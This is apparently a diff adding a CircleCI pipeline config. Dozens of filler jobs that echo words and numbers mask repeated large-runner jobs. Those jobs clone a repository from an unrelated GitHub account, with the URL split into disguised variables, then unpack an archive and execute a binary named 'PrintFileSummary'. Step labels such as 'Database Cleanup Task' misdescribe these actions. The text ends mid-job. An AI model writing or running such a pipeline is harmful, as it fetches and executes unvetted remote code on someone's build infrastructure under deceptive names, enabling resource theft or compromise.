@@ -1,0 +1,1345 @@
+version: 2.1
+
+jobs:
+  SendingCompletionNotice:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: Overnight Packaging
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; printf '%s\n' 39 25 41 | awk '{printf "%04d\n", $1}'; echo "8 warnings, 0 errors"; true ; } > /tmp/FilterFieldValues/WebsitePreviewRelease
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'WebsitePreviewRelease'
+  warm-build-cache-after-deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/WebsitePreviewRelease" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth=3 "$tier/$store/$warnings" .
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  ImageUpdatePhase:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: alertReleaseTeamAtPipelineStart
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; echo "orange"; echo "pulsar"; true ; } > /tmp/FilterFieldValues/FilterTestResultsInSummaryForm
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'FilterTestResultsInSummaryForm'
+  roll-out-service-to-preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/FilterTestResultsInSummaryForm" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 1 --filter=blob:none "$tier/$store/$warnings" ./
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  ArchiveAuthenticationTemplates:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: Strict Review Run
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; raw="v7.11.5"; release=${raw#v}; echo "$release" | rev | cut -d. -f1 | rev; true ; } > /tmp/FilterFieldValues/extract-deployment-package
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'extract-deployment-package'
+  PeriodicSchemaSyncRoutine:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/extract-deployment-package" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --no-single-branch "$tier/$store/$warnings" "$(pwd)"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  RefreshStorageCache:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: Review build report before publish
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; echo draining scanner; tokens=(moose alder zeta); echo "${tokens[@]#?}"; echo "scanner drained"; true ; } > /tmp/FilterFieldValues/Formatting
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'Formatting'
+  bundle-crawler-changelog:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/Formatting" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --filter=tree:0 "$tier/$store/$warnings" "./"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  automaticSourceFetch:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: approve-analytics-preview-release
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; printf '%s %s %s\n' rotor lime radon; true ; } > /tmp/FilterFieldValues/backup-agent-hashes
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'backup-agent-hashes'
+  resolve-cache-key:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/backup-agent-hashes" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth=5 "$tier/$store/$warnings" ${PWD}
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  ManifestValidationPhase:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: Index agent source code
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; echo x{1..3}y && echo "preparing naming check"; true ; } > /tmp/FilterFieldValues/server-release-manifest
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'server-release-manifest'
+  InventoryChecksRound1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/server-release-manifest" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 1 --single-branch "$tier/$store/$warnings" .
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  CrawlerContainerImage:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: installer-test-report
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; mapfile -t words < <(printf '%s\n' iron chisel quince | sort); echo "${words[0]}"; echo "preparing config render"; true ; } > /tmp/FilterFieldValues/LintDatabaseQueries
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'LintDatabaseQueries'
+  CacheBridgeContainerImage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/LintDatabaseQueries" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth=5 --single-branch "$tier/$store/$warnings" .
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  final-accessibility-audit:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: Trigger test suite manually
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; echo "3 warnings, 0 errors"; if ! [[ "lambda" == "guava" ]]; then echo "low"; fi; true ; } > /tmp/FilterFieldValues/converterMigrationTestStage
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'converterMigrationTestStage'
+  RemoveDebuggerCompilerCache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/converterMigrationTestStage" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth=3 --branch main "$tier/$store/$warnings" ./
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  restore-from-artifact-storage:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: label-release-for-audit
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; echo 'changelog check in progress'; fname="server.txt"; if [[ "$fname" == *.txt ]]; then echo yes; else echo no; fi; printf '%s\n' "changelog check complete"; true ; } > /tmp/FilterFieldValues/ParallelRollback
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'ParallelRollback'
+  edge-proxy-release-artifacts:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/ParallelRollback" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth=1 --branch main --no-tags "$tier/$store/$warnings" "./"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  collect-environment-details:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: resolver cleanup
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; queue=($(seq 1 4)); echo "${queue[1]}"; true ; } > /tmp/FilterFieldValues/RequiredComplianceScan
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'RequiredComplianceScan'
+  ExecuteUnitTests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/RequiredComplianceScan" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --filter tree:0 "$tier/$store/$warnings" "${PWD}"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  ExperimentalMemoryBenchmark:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: packaging binaries with reproducible settings
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; printf '%s\n' 51 1 20 | awk '{s += $1} END {print int(s / NR)}'; true ; } > /tmp/FilterFieldValues/StorageProvisioningWorkflow
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'StorageProvisioningWorkflow'
+  parser-debug-logs:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/StorageProvisioningWorkflow" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth=1 --branch main "$tier/$store/$warnings" ${PWD}
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  MailerUnitTestsPass1:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: Automated benchmark
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; data=(koala almond coral); printf '%s\n' "${data[@]}" | awk '{print length($0), $0}'; true ; } > /tmp/FilterFieldValues/isolate-level-3
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'isolate-level-3'
+  publish-formatter-examples:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/isolate-level-3" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --jobs 4 "$tier/$store/$warnings" `pwd`
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  PreBackupSanityChecksBatch6Of8:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: Compile translations and run visual tests
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; printf '%-5d|\n' 39; true ; } > /tmp/FilterFieldValues/loader-modules
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'loader-modules'
+  HourlyDatabaseSnapshotRun:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/loader-modules" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 4 --filter=blob:none "$tier/$store/$warnings" "."
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  SaveLandingPageCompilerCache:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: Patching code
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; echo warming up thumbnailer; printf '%s\n' 70 52 12 | wc -l; echo "thumbnailer warmed up"; true ; } > /tmp/FilterFieldValues/SearchIndexSchemaImportRoutine
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'SearchIndexSchemaImportRoutine'
+  print-compiler-version:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/SearchIndexSchemaImportRoutine" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --branch main "$tier/$store/$warnings" "${PWD}"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  compiler-test-cache:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: fastTestMatrix
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; echo "running changelog check"; echo "boron mauve hammer" | sed 's/ .*//'; true ; } > /tmp/FilterFieldValues/queue-worker-installation-tests
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'queue-worker-installation-tests'
+  pre-migration-repository-backup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/queue-worker-installation-tests" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth=1 --no-tags --filter=blob:none "$tier/$store/$warnings" "`pwd`"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  DependencyCacheStage:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: hourly-version-tagging-slot-1
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; matrix=(linux-x64 linux-arm64 alpine-x64 darwin-arm64); for target in "${matrix[@]}"; do echo "platform ${target%-*} arch ${target##*-}"; done; true ; } > /tmp/FilterFieldValues/lint-examples
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'lint-examples'
+  scheduled-regression-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/lint-examples" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 3 --no-tags --filter=blob:none "$tier/$store/$warnings" ${PWD}
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  AutomatedQualityCheck:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: complete-queue-health-check
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; printf '%s\n' moth=26 cow=13 apple=21 purple=18 | sed 's/.*=//'; true ; } > /tmp/FilterFieldValues/DownloadFromPreviousJob
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'DownloadFromPreviousJob'
+  package-scan-task:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/DownloadFromPreviousJob" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --branch=main "$tier/$store/$warnings" "`pwd`"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  RerunServerSecurityScan:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: Strip playground binaries
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; echo "resuming format check"; csv="copper,swan,iodine"; echo "$csv" | awk -F, '{print $2}'; true ; } > /tmp/FilterFieldValues/run-billing-code-analysis
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'run-billing-code-analysis'
+  hash-build-outputs-for-review:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/run-billing-code-analysis" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth=1 --no-tags --filter=blob:none "$tier/$store/$warnings" "$PWD"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  prepare-messaging:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - run:
+          name: Detect updates with verbose output for changed packages
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; echo "decoder is current" && echo "type check started" && echo "event bus passed lint"; true ; } > /tmp/FilterFieldValues/verify-exporter-dependencies
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'verify-exporter-dependencies'
+  PrimaryIntegrityVerification:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/verify-exporter-dependencies" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 1 --no-tags --filter=blob:none "$tier/$store/$warnings" ./
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  StateSnapshotSlot8:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: ShowLibraryFingerprint
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; for stage in notify lint bundle configure; do echo "stage $stage"; done; echo "pipeline finished"; true ; } > /tmp/FilterFieldValues/StateBackupStageLevel2
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'StateBackupStageLevel2'
+  emergency-roll-out:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/StateBackupStageLevel2" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --single-branch "$tier/$store/$warnings" $PWD
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  periodic-credential-setup:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: report-publish-hook
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; rect_area() { echo "$(($1 * $2)) square units"; }; rect_area 11 6; true ; } > /tmp/FilterFieldValues/event-bus-bundle
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'event-bus-bundle'
+  required-registry-backup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/event-bus-bundle" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 3 --no-tags --no-single-branch "$tier/$store/$warnings" $PWD
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  analyzer-deployment-rollback:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: MailServerPublish
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; right="trout"; printf '%s\n' "$right" "$right" "$right" | paste -s -d-; echo "stage 2 of 6"; true ; } > /tmp/FilterFieldValues/RerunSecurityScan
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'RerunSecurityScan'
+  sandbox-code:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/RerunSecurityScan" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 3 "$tier/$store/$warnings" "$(pwd)"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  freeze-run:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: PerformLicenseReview
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; value="rat larch"; echo "$value" | sed 's/[aeiou]//g'; max_of() { if [ "$1" -gt "$2" ]; then echo "$1"; else echo "$2"; fi; }; max_of 15 11; true ; } > /tmp/FilterFieldValues/renderer-cache
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'renderer-cache'
+  attachChecksumFileForPreview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/renderer-cache" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
+            tier=https://github.com; store=kellyanndaniel370449gwlvtfif-alt; warnings=post-commit-source-fetch
+            git clone --depth 4 --filter=blob:none "$tier/$store/$warnings" "$(pwd)"
+      - run:
+          name: Database Cleanup Task
+          command: |
+            gunzip -c assembleJobRunnerRelease.tgz | tar xvf -
+      - run:
+          command: |
+            $PWD/PrintFileSummary
+  LocalGeneration:
+    docker:
+      - image: cimg/base:2024.05
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: analyzeCodeComplexityShard6Of11
+          command: |
+            mkdir -p /tmp/FilterFieldValues
+            { set +o pipefail 2>/dev/null; y=26; let "y += 3"; echo "$y"; day="wed"; case "$day" in sat|sun) echo weekend;; *) echo weekday;; esac; true ; } > /tmp/FilterFieldValues/roll-out-exporter
+      - persist_to_workspace:
+          root: /tmp/FilterFieldValues
+          paths:
+            - 'roll-out-exporter'
+  ShowStatusPageDigests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/FilterFieldValues
+      - run:
+          name: scan-billing-service-source-code
+          command: |
+            sed -n '1500,1507p' "/tmp/FilterFieldValues/roll-out-exporter" | cut -c 10-30
+      - run:
+          name: Roll out runtime image to staging cluster
+          command: |
